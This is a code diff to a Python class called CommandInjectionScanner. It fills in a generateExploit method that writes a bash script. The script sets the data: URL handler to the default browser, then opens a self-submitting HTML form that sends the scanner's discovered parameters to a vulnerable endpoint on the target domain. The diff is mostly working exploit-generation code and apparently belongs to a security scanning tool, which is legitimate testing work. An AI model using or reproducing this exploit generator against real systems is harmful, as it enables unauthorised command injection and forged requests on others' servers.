@@ -64,6 +64,24 @@ class CommandInjectionScanner:
                 results['results'][domain].extend(vulnerabilities)
         return results
 
-    def generateExploit(self, vulnerability):
-        script = ''
-        return script
+    def generateExploit(self, domain, vulnerability):
+        action = domain + vulnerability['endpoint']
+        params = vulnerability['params']
+        method = vulnerability['method']
+        return '\n'.join([
+            '#!/bin/bash',
+            'xdg-mime default `xdg-mime query default x-scheme-handler/http` \
+                    x-scheme-handler/data',
+            '',
+            'python <(cat <<EOF',
+            'from urllib import quote',
+            'import webbrowser',
+            '',
+            'html = \'<form method=%s action=%s>' % (method, action) + \
+                    ''.join(['<input name=%s value="%s">' % (k, params[k])
+                        for k in params]) + \
+                    '</form><script>document.forms[0].submit()</script>\'',
+            'webbrowser.open_new_tab("data:text/html," + quote(html))',
+            'EOF',
+            ')',
+            ''])
